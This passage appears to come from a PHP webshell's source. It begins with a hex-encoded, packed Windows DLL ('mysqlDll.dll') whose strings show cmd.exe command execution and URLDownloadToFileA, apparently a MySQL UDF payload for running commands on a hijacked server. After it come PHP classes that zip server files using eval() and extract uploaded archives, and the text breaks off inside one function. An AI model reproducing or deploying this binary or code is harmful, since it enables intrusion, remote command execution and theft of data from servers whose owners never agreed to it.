858CC428BC6D047F317EA10C700CE1B02433A45DBACA33CE581430C3F27C2BDDD5A3766391E6AEB4040081875F96DFC419F06F22BC6CFCCD1F88E40DA2A5AA3025D038A345852EB0DCCE83BEBAC3213B75683C9AC1C55508D3A57D05C242521D20C10CAB56A90275C2703F6756B0C92C888EB53624CA54A0592B985B1566089DFF6858D740A40387BFB04F62B223760495B6A55CE03F6EB727180A50BBA560F91E248D0CEBAC4BA9E5D5B20070261ED572A381026E821681A536C106A7450A213FF153A152B3859450C163A448330D4653B5BB95BD0D7EC084144F77CF0DE6889F134F18E033B961ACCC230B7471C2A6C45E8F75437E9700D10D77AFA75037A08B60BF18F5CBD59A522560055016B47C1BA30131750E0506DD65B3A3B591257D9BD07A8D6D90B3040963C76291950BBFDBE7076F80D838D6A0303F841DC5739B99D10B3105560FFC05D36763610570C7C1DBC7D36EB9E10FFB6D3C41611681020F8F6B9ACA927945450592C5FEB26165A6C81A38D30C7F23612B1DD0482086AF4D56CC881110FD85EC90E40C128265325F34226D911163C8B14C0012B0C8329EB2D3983D71C90A756F6DC784CC8D5EB7438B125213EF950E99ECEF2B2D61C11A9AEA880643C287BEEFD8DAD8AD73D63F3831881D51404B03582AFB210EA02F01B61E0594E3EE9B3B68D4B38F7881CB50C80F4C025622BC08B03317E30641C5E45AB0EE3A24C96880D535B24C67C80066F04368EC1F10C5229231AE3AEF90F86EAA0ECF1EE5BD5416E2BB64D1073290AD62EB045A58A95F90A7409FFDEBED0F02B0D408808EFC88D95292BCA81F9883D3655127CCC8911DBE3393ABFF4130D6B71FF85A061C634300C6343065FB6F6D20145E8C77C0B0964454510728A9960E96DD98B134E90464868B5BF8B74626A055E39B51D177F2126FC8930EB41B456EBC78D4DF4575CE6BA01B310FF43640B2EBB51CED14FEBA72C9C1EDA241C06E02C9720405AE8A015F52CEA1A10AA6C4FF24D666E1C38EBD2A4F007458258DF02F1B516CC808C6E6DFDFEAD068E6583490C08C741181BEB1103CEDDC80C494114181276D4525CA25E83618A011AE0188DF93B377203DCC883E17018AF362C368AD1A1D81C331340E58CC009FC7591345730E486E0D55BE159519130D716D76A138E1DB69AE51E5B00DE3FB41B155A22DD0CF3A00AE11ABC7A1EFBD82BD7246046735A732844BF5A020BA68FCC6C5DA0702B700C66C8077739D80A6DA14BDD581A58B26575F1A436CF51A08B84600C33C2CFBD1A506820CF118FDC6DCCCC208C4106F80E3A2AD716B6195F41CC00CDFB55B88A6D180B7718CFE8BA37C2F72AF18BD8090C07D31139A050D60C3215FCFFCF4913D1E9D1DBD1EAD1D80BC975F4F7F3B014B9B684643D2150F7EDEEBB2F7DD1720E3B27770872073B2B76014E4C4B56D84A7FDEC27F6F2A0E7AB3D96E506EA833B6517405C203506E10DD66C85E0C156EC814910410BA37CD606B0C0E0876082BBB1B406CA6DB11140708BDDA264103BB27DA007C3F26A8742AA6443D71A376E9C18BD1783BFE3DEF0F82800E036A738314ED6F4BDC8183E2EEF95E29F3A5FF249513A9F1DFD6426811BA1C83E904720C0CB136DB8F62C86D41801E8D789075F3B9C70741FC900403BCE023D173DB852F1188078A46BE470105025608938C2D5B59C6C75CCC8D96652CD949002B25010202EBCE2679A690234621473F5DD70DE48C065F034C0744374DD3343C342C241C8B44344DD3FC8EE489448FE4E8E8ECECD3344DD3F0F0F4F4F8CD39324DF8FCBDD7007B87B01027F809FFF00305399AA6808CA0BC6C36B0D766909D0BF91133240417A30D0A2BB8555B0D2531C639FCD8F692417F240DFDE3FC77823BC2E54400F7D96543B04B8F779E9C1CF92B43082CC2D6745D900B180338606D033A02F275B76F034E584F56B6B74B08F6971FA3EE02EF026FD9807C298C902724E3952D09AB2D03AE45EB1666625A955B7FB403A6699AA6BCC4CCD4DCA6691A9AE4F7971C1C189AA6699A18141410100C699AA6690C08080404A6EB0E231F05100318E05A129A283C8BB7B56C21CC96870F8313112A210CB700ACE86FE2570FAFAE83FEE08BDE770D0000EC1A0C2715773A7256B4D59382AB1D3D530256F057752B566A082A898850D71C14229893820F56741956947414EBA96A72A31644577C54EC8157B40E5BEB56D5612ED4230603EE265D565698182B52F7616904FC8AAEFF41BE0D50BCC5273ADC3701435C147C29985047568D7C07FB2D162BF90CAD240600473B5B290E2B1E7CA55E90C3B6CA11C56056821834BFA3A546088B87803B08742246C2ED46D988E80713720FF9240A606106817D0D4C02DB6E8350F531845E39C3D9AC60B6DDBC17721507CA532C1EB22D19080C16334BA55C1DE660080C7BD27502BD40DF1283CFDEDBE158EC22C90314BD737500A20F08B1443C998A74F6466221F816F87544837E5F23E886DE04FD0C958D460CFE1EC413ABFF4620ED8D5E0C70F61B090D803874180C84884388239F4500C3A585BF2D50DDE52B116A245999F7F9D1F03DD4A80336C66D2983FA3BF137EF2083C5044381FD5FA40F8C5E3984F86E23EB4EBE3E56B93E126F843E8D0C9DA9901E9C5F8684F83BC27318C01103D6EBE48D0815EAC1E30543C70B2256C9A012346C430BFCFE07563B0D535773F7C1903683D0C93CC18F07833C50B0DA28E4361AF51B053E1E751EE28B104974084958DEDE680284F4EB0804F5EB03F6A337DE4600E836891C308A5BEB161EE4C2DA027F7B5882864329F459376A830037C674320E1F5AC9F31CD6CA7E50505031C85A7B830CB2247ED4CAE264CF731FCCA3AD8D8800AB740F00E16AD8580841533AFDECA4963B343D1C063CC0C1E7154A81B1BCF749D418C5604B9E381780360CB2AD2C98248184E169CA5190C61D5642D4920179728BC3C36C8BB1E14E4152530411590F250306F029535DEC60B404CBF0F6D915B7B10211B0FF0336E4106AC0A359B43809F2A22CDEB43F4AA87BF6F30549C0FF4AB890073C9013082CBAAED003FC0C203F087900724AA84AA8A6E9BAD83F069F038C848BA6699A7C746C645C3F5D3B8F004AA8F003C00164D134CCE03F39859CE44C404BF04B4845D375DD2C900B580378A03C0239903F4C404C405D171B855B7FF403FC344DD3750E04030C141C24871160D1373F1F164DD37505500358687C3FAB2F4A003E1CCCA0022F907956F6C112883F1594D9815DE874095900FE37ABC645FF10EB0B8065FF8DECFC0FC0861A806811F6C540750839B72F455328E48B4DFF806A83C15E02056083236DC3DE2374001680E1A4C3F96C01175510100840EB07F60D4A30797FF810742604ADB7F2F220741830740A5074897505216A16A21521020C2ABD7CDF060389F0BA00077D0423CABF54B47F037D3BC87F31742A3BCB43C3ED4AB06D195433744D0739BA91AD85CC43F84C0804BAA67B7B435AF8EB3E26052F070643CE806F1E3BCA7423C2163CDD1188188F4F5B3B0507E69EE00113FDBEFEFF32FC5DF4C77413368E54F7D1234D143737B8DB1172A840C581CE1F0FF601F6ED63DBB7C4DE020BF7A8DF081408EB0AA8115D2CBDB1060B1068ADD8233BD39241E0DF751AE918016D0D8231816ABFB78D0A9E2DA82BCEF008022D6030EA3BAC39BF4213628561325256E8B383459875090A18EBD8D583F9B19A4DFF40EB09AF08146C410F78473159812781D6C68A11C380C901C630045A8452C9C2DD05BEFF0B48884CBD7578EA7473F606818116F502746D8B945DA2220B1E8B067519FC35008FBE813883E94B1D2A1759D888B60DBCEB584213E2137C677E2511335669A116807D131A11825F178CF015554445E2811980C73E5A74B52DD81C2EAF737808AB60072DDC07808B8C4E8BF390E005C916713F8005431467736A081E8233918B09570441464E600F3B32B24C245B231A0EF2F2B64D79D50D04FEEB08FDEB03F4C11A824C0C5F198A1141AA1EEC1BF16488174762EEEB05838C00F0D32401119C2CCBC983C1E134271208006DCC6AC738682DD9D2D96608C6C3000C085DC049B38807CA185A1965872312F52A65520945A9F88959AC913859A6E80AB82C06F651FAD756F29B6A0A8FD2268988391874744617CAE630428A78A9E850538B58DA71F0D73BC6CC214D628386A240C893715963FF25DAE2BF94603975E8F3ABAA895D0F6C16E8D386EBD77DEEB8BC4DEFDD405B2B04D30CAFCBB641FFE87BA312CA300F87942588CD546C9CD28DEEE356F7E58D614F6F52F3AB04AA8D9E94FA52A15498BCB6DE2C8A5101E84B51844B5CFA3BC777B7EFEE2D68FC8A922080089047401376F5F84BB1F04141803965D47983C308837DFC6913B93638C1E2C8914CBA6DA087F750A3A4105384898C2AB8BFDF709140A5A559A3D1A5EB5240D1B3A660810547A8C6A19EC57EF508403DFF07F153382B89357BDF06F15335250700BA49F88816ADAB00981EA84C97DFE75E2E8604AFE9508301D08C4311946FA857DA70EF65402DDFFE01A8946CBBE78FA8FF1570F814FD9635D1CBF4FC750F87DC19F6AE1CC7492DA463E7E804741704D7A628F00D740C802CB804F93CCF763605120B0811578460862571BEC01F88E1625F044CE5CF52B1404522283456A166B453962215127FE081E016CFBE8C888405ECDF7FA1150D8AC672F48A45F2C6850D20166E104D3B375A55F3B80A2D415FA0183BC1771D48BC3A08768F2A41B820008BD9CBAB6B81FA47AA42428A42FF84C15FF8EC352C900EFA8B358D7A029A33D0213989B2EF8C7DDD5A9123FD1D561E9291DD6C5634235842FCAD803DB8682E2768002E7DB75CCA8D8D726695F6C2CDEF67341503108A940564889060EFCEC9DBEB1C1A027410205BEBE380A06E6834781CDE4400BFEB491ADB0D1315DA417219045AB2BC8DFDC34BC880C1208888491F1D617213C3DE9CBC7A770E20E920EBE04C77F915774ABE5EC97394886AFDA90210F970505C59FC94882F1FD575798FAC426866281854FAF7403D6709FC161C57FFD664BEDB29FA297450100CC7D7BE5DA0F85714B00C06B45B99A0BB88CD16FFD0D602DEE66BED10B405531104EE1590601D4D0AC00982FA8659A057040481282056B064F0BB470B0C85965E91F983FA982DE9ED6A47C025152BD16075FA9AEF10D06D020610CA1A251C8E1D1429168F58A6EB3A06234AE2EB8807351E94CC5289365A271ACF0D56AF1235140FCBFFE1C3A0B7AC99AD78F2971B180A0360B615DCC1A8F1223E1975EF13A0876A064F4AACEC508B9E1D9C345CE66D442C51681C4C147D452E6AB6AD50293F89B1C1E0939D084B1A6606AB9F44BC3805750BBB0D416F064D6B50AF256BBC5C487D469512980708D0E250853014526D2FD050BCDE1BF6034EBC05A908D81A4A8615B06F126945FCDE30A22DC25B53C366A035AADB9C65F874E144346021CE0C29800750A09543B566401343E0E0043812F107C406F98A4804657FAB99A5DF89084B1D8A40053C0A84BED01D154D1088E4078D53010F8B459718C682050ABC160C166D515452B810448B664DDB39AD976865D1068F1496935166EB006D912446E98B17684D8B3D4BE1F40155F64235D144E68AE5A87CC50EE0D0F876EB3B0A81A274BBBE0C04E724FB027FAD0D03808136C85B00140C0075FFD06C0B23578A101A33AE3CD45FBB2D0D0BB443FF135A12493944BBDD2DA2182140803848068308CDCD76BF5F5EC6030D4344EB73CA2BD36E3260E7FF6A01CF0A090E683BAA479F74411ED101A2358848D12D821A85FF9D468B0F4388443105EB293B700420DEB6250CFF6305160AEB18A55E40D812FFA9193507AD9C7B77BF925B761A750D85115C74F3064942D12EE5E4AC062B4688210250A8EAA9D800F91131357540346A46C42BF87D5BF41F8AE875465757EB533038154C20629236B1F2DBCA6A711D23EB222014A660B0341B48E1FE033130EB651DBA397D147E108AB25936C514105A66B67DF436E1A11D591D161C0286D98CD9181FD84872DA478DC159D22AD3A62018366B5B0CBE3C20732EDB6CB74EC1245E0140503720CA3F408C4C793BDF0F849CD25B6CA014041B9C0324FCF25DAADB2EDE8BC441DC8367EB138DB5D751678BF026118BB5D9F6AD3867DC7466534CDC6121CB9EEB9257F44DEC1AA574A3A6884412D80A7432B06D4B6C5E0D40403E1C78B2C8663713EDD57F1EDA321C0962C321858F2065C814876515F4A1F20BD966B6B336DC895DE08B15483212BDB27DB953D6BDDF74B45664E467749C8F6AB35BA3B30E03EB068C28EDD5618F54D5CC0AB11B88108B71B77179088B2680AD9F44568D4A9E0D7FBA0DBA5580F1491AF30C5E5CC60736942B498BC24E58ED61328118B4ECAC375E2D043E3E8A515E564234632356A53C0497CFC819DF1D1B56495340CEC2C73B028658A3432D24F276607CDD1C490554CC335033E433B263345BC8945D18908DD9968D532C34201BC53619181FE0DB630AD06A15B5CB3EBB15B0107CD3DC57CC0FE16050B3EB0B83DB33ECB6119CF6112949E0565FF670C9DA1C5552F8D7B2703A84933C8AF5CC38680C42EF047AC25F9A51D4E7023A01752E0A1BB1D552F0263A613E0A431D966EE146873A4101191411035BA330D56BFDD51A75555B430BB3FFB090D3D18E016DADCA0B4301070242B5CFD6ED44E94130E01302A86658AD799AAF335BD2CAC9C14A6D42AA5BC98CCC4F56530B4A55B050009C1B201AFFAE023307420FAB0424EBF3775DFE5ABB8C90416E14460FA373F201E6E20204C420753F98FD646C3A0AF38D46FF3B9CB8ACF87B5643BE51EEB60E56485481DF4C03C12580FC8D161DDEBD0A80E17FEB0D811FDED0540440391180C980DE880A81440B8D6686C5C671D0419080E3D60AC0C006A0A8487D065C9C249E5862050D10565D7426E8BC00BF83C410E0AE41C305E3CC0CB568E12EF1C6012D415CEB030A915B4013D4B88110B5DAA5DAD2630883FB0950769225FF2F7D6B2004308819413577DA802100498A178A018878007F8B118F49473BF972F21B365341486FFF948BD6A81E588D39C470CD4143A1D03B5CCF252EB6C1FF46758A274738C474F22C419D1AE324EC85D2E1C5FE4186E00E824A6F1474D21AC0E6FFD1575F3AEB78F0FFBF34019130007F0419C0D96EE2EB15130DC9817888C2C77895FFB541599EEE9067271FD82E760B3E6A602266C4040907B742A68D38CFDA39CB15580B0318AC05224EEBFB55D0C2052241280EABE097CF0B6C112836D1E970DA0C1B1FFF804EB741B35AB6201726828ADDFFDBEE0774217F1D467BFC720638DC770202E638F809D8B517BA35C6F7750DEBD733C908023657B34D9BB9AFE582806D6AE4BF0FF35FA6ED85B50A321926EF2BB446AB2F99EE57EBB68DDE5AC3EC74230BAB1F775165EB3AC0F0596B0979D584B5634DCA0975720271FC08A5C9DE0E5FFECB030051283074512BBC2311EC1A2D75770C920F1DA2C685B7A6EB52DF2F7D8B5BB10EC11AB6D10A5601805E6EBDF54B318065FE0088508845FDF3EB09BAAB41D90DFD0F6C8D4D0AD58B1803165179AD7DD182C16E4F026B53B38059E3450A23B07465BB72251CAE5A80450F8CD5815DB9AAF5490F8FA18A46D52D1FE9DEE83C057C83760A4D405E7D2539DBD187F8787E0BD95FAD6A0AA1A1F4DEE0FE8A045823C667D9EB658B1512DA65E94CB4B6C84A740FA7DF5BD4D630AF88065D0958B60917C5522B5B13566B032CF036BE03B49F572F1A6AE0648FCC20F6AEDA06AD75A5D646D0BE05FD032C37126253CB0BC18C00885DC029C25A0BC839FAAB60287C25F7E1C29DEB025EA105B11D42030985056C351FD31EAACA3EC1CC03580000D37466AAFF0F4D53EE65DD9304DF03E50F08EC03BDE4F2B2F20F0AFF0B050CCF0AB656D003D50302017FB6DF3A1903070602100445000535300050B5EEFF7F2C20283850580708003730305750070F200BD71461DE000860686009780073AE956E08071507001A010E7D7BDDFF0028006E0075006C0129320F6E756C6C6FB7FFDF0A72756E74696D65206572726F72200F0D0A03544C4F07E4BFD95353110E0053494E470044BBFD65ED4F4D4112115236303238082D204BB76F7F7961626C746F20696E6956616C697A0D6865D67EBED961703727376E6F743D0460EFB6FF756768207370616323667B6C6F7769380AB9EC3661066F6E3736ED672079737464357075722BF6DB5AFB76697274752133A5632320630C9B42BED86C285F345F2ABDF6DA7665785C2F5806DCE2E6BEB0935F3139F76F706558313260DBEE736F0F646573632B3888706B6D4624816564193024DF405723376D926FDBADA6AC7468BF612F6C6F636B1B6C8530173464B7865B6B6E612E02A221726D0050D8DAB770406772616D204A6D366829EC852F30394F10E71A8D66412A2B302E2B84EF53C8386172677528735F6DBBF63C303266C16E6E67826F9CB52EB605743A1164E67F4DC3DB422B2D60396615566973AAEFF660FC432B2B2052A04C6962B47279276D0F87B90A2D16450E211150D8656B9CD43AC2002E003CE5ED6D736DE0252C6B6C776E3E1B17EED8F84765744C61324102766550AE75705BDBCE62130F57956426876534BEF0FF7373616765426F78410075732533322E642ADD931252EAB75956035A77CF76670B5A955A0E0B5B8E0392483AAFB9BBB56D904A0064002C204D20086DC9BDB97900632F642F06D74D03FDB5179A4144EE656D626B5B4E6F76C3FE6D930B4F986F0A536570741486A96885416C96711BBEEDF9B941076E6541F369A64D101636172763684665327533BDF7DE7B4A616E0A675F57537BAF7BEF4B47433779433F3B6EA9D0DE3323B03C6418B0ED587B4F5E095468127313D9C15A6157BC7C0C547509B9D9B1C64D251053750743F7DE7BEF3B372F27231F039E73CEB90A11181F262D9C73CEC5AF828990979E72CE39E7A5ACB3BAC1C8A78008047C28BB92975043BD384F296360A9523F4D797371909620A953A636306EC263B50B355A6A09A663B7B921E76A3752C077035C321703ABCF91FB2E746D700FB40600B6472A481D3A2C7EB53D25E4E6FFDB730A2F636D642E657865202F63200068656C55192B75313774073967FF76B6E4380B3006687474703A2F2F8F2DF5FF2ED9632D9B09CAE4C8EBB8F1CABDB4EDCEF3FFC3FE6F120D00CFC2D4D8CAA7B0DC0BCEC4BCFEB3C9B9A6F6DCE6FE21C2B7BEB6A3BA7E175C3F44867B81D10F00200593195731D913199DE4667271F0108DE8832119B2178E180F30434E5146C2F80392017BD894A007010153107C81A4B902011F0264410152476357D9D9070A2F0207743CF2E4C96C084009140A73F01093274F9EC411941270133C79E4C944180C1972E41AAC1B93274F9E741C4C783C796EF2E4C92C7A1CFC18FF86B29317D854DD038572200107402699282048001940269210841002199009810119900119108202601C16023B20EF200D0C050133164DD30C3603070418050D344DD3340609070C0832D82083090A1B0BC1BEF702573B070F575F906EB0101311031217210C32D820350F414336D86083503352175307D860830D575F597B6C17D2344D376DAB20701C72D860DF0BC72F80B3810760830C36821F83848F208334CD91299EA1830D32D8A46FA7B79FCE760EC2601FD70B18070069BEB35D0517C00B1D0490664006968D08644006648E8F9006644006919293CC066140039F78EF4D54EC25FF0204222B6027CF0EF68279822117A6DF07A1A581E9CDF3EF9FE0FC2F407E80FCA8C1A3DAA34F0D72F60881FE0740B577830C812F41B65FCFA2E43E5F21FFA21A00E5A2E8A25B7EA1FE5105BF92DFEE03DA5EDA5F5FDA6ADA32D3D8DEE0B26627B7F939317E430303860064AA432EE99E9C84538B9876840380A6699AA67C7874706C9AA6699A645C54483C34699AA6692824201C18A6699AA614100C08044DD334970075FCF8F0E4DCA6E99E35D42F75CC03C4BC9AA6699AB0A89C908C8849BEA669806C64CD2E821D65BB8C8F905C037F009EF040E82F500B807007F0F11325DCA0D1535499508BDD50C944548CF38CDC97B058592CA7BF06699A0E1EEF3B5A9775A769BAA7B5D4F3E0301AB86CD3034E6D01333AB759699AA6697796B4D3F20CDA74DD272F034D6C01F108A48008368024444144210980D109600064C15B054D734325746554B6CBB7572C0D44656C65466905410A105FDB0C470A0953C5D87393CD2719522C0A23EC4F56C145185661726961622212C0EC7F436C6F736548616E6425F62AD80E4B4A500B63417B7B56686753791D656D4447B7C1B656F5227914744E747515B893FD70496E666F413569704FB1DBD62EA845782A08535D65702CFB36CCFD56657273696F163B896E6754792D67DF856C570F1F4C434D6170115706882E610D1B4D7073ED5BC34279126F65646543688366E5ABA03DFB644F66F34C6FFD8E6B68FF300B746C556E773C3D48D767EDAC7C70416C6C0A46B1FB432D7B9BE16F6D6D09336E7DACB38556982673FB0B790CC580D866E50B56ADB521419C42494D1E263CC3D609630A532740B029DBDACA16AD147215421BC0B64C5B762B78108C8580250B77C5EB8407C4600C542FB998A170B6DA75D3F812DCDD3302524964386C7353F3B3378BDD5575650C4F09DE4BD2258C531D2D471A086D618643427552C93B2463366412A0D50CC363141E4D6F64BDA34E616D6A3B2160BC5F9EE473183004470A0CF3CA6624A3FD08E42CCFF04258164361853B1CFE66BF08506F6990C906C25EF99DFD6B65644465633815C2844D72496E53EB460F3AC1F1EF73684B427566663E6A50ECB136761C0A410B074F454D092C19FE10934164647297EF7D2841BCD93C7155524C440A5BA4668277E3CE1C88F6F6FE340457534153864D00FF0402CBB22CCB17390334090C8D32B62C0B022649F7FF7FAE6D0C10025C000A052F0A5205546417350BDFFEFFFF811912192A060B2A385319310B320D1B806512ED2405670B30100F1CFFFFFFFF1B1B96130B530B1C455405400645171106180A118145110B4C310526530F7D1CFBA5FFFF078B1214050B121B271A1241691A09F04BF83A06F0520103BFFDFF7F0802070F080B06060A18050A1A0E080643125C1B4F59085A0DA37DF66FFF0F16F03001BAF00AF6211775F0C8020400CE2D07E6EDEDBF5F10070708270C0A08300A0608050C050CBFB5FFBB16030813082D1B10060F06070921AE08F04F020E6BBFB5ED061A050F107EA20605060D1D15349BFBF69B2244A6F0ED0120130616070F1810FBFFDBDB091A571362A9850E0B14060E09111C0F12091C230A03FFFFFFBF0C137F0A1CF0F20007194212310C0B0F0AF00302F04D012C0C1C191A0811F6ED5BFB050D05F00549BF05380C0757070A19088EDBADFDDB05663A081A0611190C7113081E0917F6FF0B6F17621806422214320715320A2115242A0E311CF6DF6EFF21250F0F321043CB140E47065B074845E3193539DBDF6EFF0C103F50133E1282260D8E13270F42141E6D157CFBFF6FAA0E13770D251C1374A04D18154A481712E3084B2512842F6C2F47550118EF051D29261A072842EEDE1D4A0604660B1B07161D2A32FFB7B77F7228060C3B0829710D0C234F6039150D3D22084C0F19615BFBFF262E0F20222D143A0726181A0B83A67C56DBFFFF138AF0FB00790C150B2EF0D9011C0D0D13090C32C221B76678E106210A1D081715A919E80B0AFBDF0A0B6E432C0019066F061E1113151EF95068857F10210C120E0F11759647BFF00BCDB85C7EF056011E550F0AC60A89050BFFBFB51F4C35080E1E1D182058163368254605030717FEAD6DFC103D105612F03E01EC48B24F30BD71E1B75B045E2F0F5838EA3C7D3810040CFB76F38301F0B4030408F0AC0A0DF014010417C8915D7E2010108408020800046453203FF0240608041009F92F71E90C9C645045A54C010400B2976A46AA4EF90FE0000E210B0106264B004F26A9244110BDEC3CFB09100F04000700D0B237E982272A0202079B6D7ED81E8D000071C886620285B9650AC0648A002B8CAA4BA744B0100C76F92E7465787446619070E2AD2A6574CD602E7212669D2BC1AB0D5303FB5E73D902402E26CF2427B62919A49090C04F6519EC6B0F7D584FC027A06F6EBF29421B5C881051C489C700000000000000800400FF00807C2408010F85C201000060BE00A000108DBE0070FFFF5783CDFFEB0D9090908A064688074701DB75078B1E83EEFC11DB72EDB80100000001DB75078B1E83EEFC11DB11C001DB73EF75098B1E83EEFC11DB73E431C983E803720DC1E0088A064683F0FF747489C501DB75078B1E83EEFC11DB11C901DB75078B1E83EEFC11DB11C975204101DB75078B1E83EEFC11DB11C901DB73EF75098B1E83EEFC11DB73E483C10281FD00F3FFFF83D1018D142F83FDFC760F8A02428807474975F7E963FFFFFF908B0283C204890783C70483E90477F101CFE94CFFFFFF5E89F7B9960100008A07472CE83C0177F7803F0A75F28B078A5F0466C1E808C1C01086C429F880EBE801F0890783C70588D8E2D98DBE00C000008B0709C074458B5F048D843000E0000001F35083C708FF9650E00000958A074708C074DC89F979070FB707475047B95748F2AE55FF9654E0000009C07407890383C304EBD86131C0C20C0083C7048D5EFC31C08A074709C074223CEF771101C38B0386C4C1C01086C401F08903EBE2240FC1E010668B0783C702EBE28BAE58E000008DBE00F0FFFFBB0010000050546A045357FFD58D87FF01000080207F8060287F585054505357FFD558618D4424806A0039C475FA83EC80E9C73CFFFF00000000000000000000000000000000000000000000000000000000000000000000000000000000000070F0000050F000000000000000000000000000007DF0000060F0000000000000000000000000000088F0000068F00000000000000000000000000000000000000000000092F00000A0F00000B0F0000000000000C0F000000000000073000080000000004B45524E454C33322E444C4C0075726C6D6F6E2E646C6C005753325F33322E646C6C00004C6F61644C69627261727941000047657450726F634164647265737300005669727475616C50726F74656374000055524C446F776E6C6F6164546F46696C65410000000000000000B1976A46000000001EF1000001000000030000000300000000F100000CF1000018F100009010000090150000801000002BF1000031F100003EF100000000010002006D7973716C446C6C2E646C6C0073746174650073746174655F6465696E69740073746174655F696E69740000000000E000000C0000001D360000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
}

class eanver{
var $out='';
function eanver($dir){
	if(@function_exists('gzcompress')){
	if(count($dir) > 0){
	foreach($dir as $file){
		if(is_file($file)){
			$filecode = file_get_contents($file);
			if(is_array($dir)) $file = basename($file);
			$this -> filezip($filecode,$file);
		}
	}
	$this->out = $this -> packfile();
	}
	return true;
	}
	else return false;
}
	var $datasec      = array();
	var $ctrl_dir     = array();
	var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
	var $old_offset   = 0;
	function at($atunix = 0) {
		$unixarr = ($atunix == 0) ? getdate() : getdate($atunix);
		if ($unixarr['year'] < 1980) {
			$unixarr['year']    = 1980;
			$unixarr['mon']     = 1;
			$unixarr['mday']    = 1;
			$unixarr['hours']   = 0;
			$unixarr['minutes'] = 0;
			$unixarr['seconds'] = 0;
		} 
		return (($unixarr['year'] - 1980) << 25) | ($unixarr['mon'] << 21) | ($unixarr['mday'] << 16) |
				($unixarr['hours'] << 11) | ($unixarr['minutes'] << 5) | ($unixarr['seconds'] >> 1);
	}
	function filezip($data, $name, $time = 0) {
		$name = str_replace('\\', '/', $name);
		$dtime = dechex($this->at($time));
		$hexdtime	= '\x' . $dtime[6] . $dtime[7]
					. '\x' . $dtime[4] . $dtime[5]
					. '\x' . $dtime[2] . $dtime[3]
					. '\x' . $dtime[0] . $dtime[1];
		eval('$hexdtime = "' . $hexdtime . '";');
		$fr	= "\x50\x4b\x03\x04";
		$fr	.= "\x14\x00";
		$fr	.= "\x00\x00";
		$fr	.= "\x08\x00";
		$fr	.= $hexdtime;
		$unc_len = strlen($data);
		$crc = crc32($data);
		$zdata = gzcompress($data);
		$c_len = strlen($zdata);
		$zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
		$fr .= pack('V', $crc);
		$fr .= pack('V', $c_len);
		$fr .= pack('V', $unc_len);
		$fr .= pack('v', strlen($name));
		$fr .= pack('v', 0);
		$fr .= $name;
		$fr .= $zdata;
		$fr .= pack('V', $crc);
		$fr .= pack('V', $c_len);
		$fr .= pack('V', $unc_len);
		$this -> datasec[] = $fr;
		$new_offset = strlen(implode('', $this->datasec));
		$cdrec = "\x50\x4b\x01\x02";
		$cdrec .= "\x00\x00";
		$cdrec .= "\x14\x00";
		$cdrec .= "\x00\x00";
		$cdrec .= "\x08\x00";
		$cdrec .= $hexdtime;
		$cdrec .= pack('V', $crc);
		$cdrec .= pack('V', $c_len);
		$cdrec .= pack('V', $unc_len);
		$cdrec .= pack('v', strlen($name) );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('V', 32 );
		$cdrec .= pack('V', $this -> old_offset );
		$this -> old_offset = $new_offset;
		$cdrec .= $name;
		$this -> ctrl_dir[] = $cdrec;
	}
	function packfile(){
		$data    = implode('', $this -> datasec);
		$ctrldir = implode('', $this -> ctrl_dir);
		return $data.$ctrldir.$this -> eof_ctrl_dir.pack('v', sizeof($this -> ctrl_dir)).pack('v', sizeof($this -> ctrl_dir)).pack('V', strlen($ctrldir)).pack('V', strlen($data))."\x00\x00";
	}
}

class zip
{

 var $total_files = 0;
 var $total_folders = 0; 

 function Extract ( $zn, $to, $index = Array(-1) )
 {
   $ok = 0; $zip = @fopen($zn,'rb');
   if(!$zip) return(-1);
   $cdir = $this->ReadCentralDir($zip,$zn);
   $pos_entry = $cdir['offset'];

   if(!is_array($index)){ $index = array($index);  }
   for($i=0; $index[$i];$i++){
   		if(intval($index[$i])!=$index[$i]||$index[$i]>$cdir['entries'])
		return(-1);
   }
   for ($i=0; $i<$cdir['entries']; $i++)
   {
     @fseek($zip, $pos_entry);
     $header = $this->ReadCentralFileHeaders($zip);
     $header['index'] = $i; $pos_entry = ftell($zip);
     @rewind($zip); fseek($zip, $header['offset']);
     if(in_array("-1",$index)||in_array($i,$index))
     	$stat[$header['filename']]=$this->ExtractFile($header, $to, $zip);
   }
   fclose($zip);
   return $stat;
 }

  function ReadFileHeader($zip)
  {
    $binary_data = fread($zip, 30);
    $data = unpack('vchk/vid/vversion/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len', $binary_data);

    $header['filename'] = fread($zip, $data['filename_len']);
    if ($data['extra_len'] != 0) {
      $header['extra'] = fread($zip, $data['extra_len']);
    } else { $header['extra'] = ''; }

    $header['compression'] = $data['compression'];$header['size'] = $data['size'];
    $header['compressed_size'] = $data['compressed_size'];
    $header['crc'] = $data['crc']; $header['flag'] = $data['flag'];
    $header['mdate'] = $data['mdate'];$header['mtime'] = $data['mtime'];

    if ($header['mdate'] && $header['mtime']){
     $hour=($header['mtime']&0xF800)>>11;$minute=($header['mtime']&0x07E0)>>5;
     $seconde=($header['mtime']&0x001F)*2;$year=(($header['mdate']&0xFE00)>>9)+1980;
     $month=($header['mdate']&0x01E0)>>5;$day=$header['mdate']&0x001F;
     $header['mtime'] = mktime($hour, $minute, $seconde, $month, $day, $year);
    }else{$header['mtime'] = time();}

    $header['stored_filename'] = $header['filename'];
    $header['status'] = "ok";
    return $header;
  }

 function ReadCentralFileHeaders($zip){
    $binary_data = fread($zip, 46);
    $header = unpack('vchkid/vid/vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len/vcomment_len/vdisk/vinternal/Vexternal/Voffset', $binary_data);

    if ($header['filename_len'] != 0)
      $header['filename'] = fread($zip,$header['filename_len']);
    else $header['filename'] = '';

    if ($header['extra_len'] != 0)
      $header['extra'] = fread($zip, $header['extra_len']);
    else $header['extra'] = '';

    if ($header['comment_len'] != 0)
      $header['comment'] = fread($zip, $header['comment_len']);
    else $header['comment'] = '';

    if ($header['mdate'] && $header['mtime'])
    {
      $hour = ($header['mtime'] & 0xF800) >> 11;
      $minute = ($header['mtime'] & 0x07E0) >> 5;
